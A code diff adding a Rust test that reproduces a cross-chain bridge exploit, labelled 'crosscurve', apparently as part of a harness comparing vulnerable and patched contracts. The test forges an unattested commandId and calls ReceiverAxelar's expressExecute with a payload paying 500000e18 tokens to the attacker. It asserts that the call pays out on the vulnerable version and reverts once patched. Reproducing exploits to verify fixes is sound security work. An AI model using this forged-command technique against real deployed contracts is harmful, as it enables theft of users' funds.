@@ -1477,6 +1477,27 @@ mod fixture_tests {
     }
 
     #[test]
+    fn crosscurve_2026_official_exploit_and_patch() {
+        // Attacker calls the express path directly on the destination with a
+        // fabricated commandId the gateway never attested, and a payload paying
+        // itself. Vulnerable: no gateway validation -> PortalV2 pays out.
+        // Patched: expressExecute consults the gateway -> reverts.
+        let Some((vuln, patched)) = eval("crosscurve", |w| {
+            let mut cid = vec![0u8; 32];
+            cid[31] = 1; // arbitrary commandId the gateway never attested
+            let forged_command = Token::FixedBytes(cid);
+            let payload = Token::Bytes(ethers_core::abi::encode(&[
+                addr_tok(attacker()),
+                Token::Uint(parse_uint("500000e18").unwrap()),
+            ]));
+            vec![ucall(w, "ReceiverAxelar", "expressExecute", vec![forged_command, payload])]
+        }) else {
+            return;
+        };
+        assert_exploit("crosscurve", &vuln, &patched);
+    }
+
+    #[test]
     fn nomad_official_exploit_and_patch() {
         let Some((vuln, patched)) = eval("nomad", |w| {
             // Attacker calls the destination release entrypoint directly with a
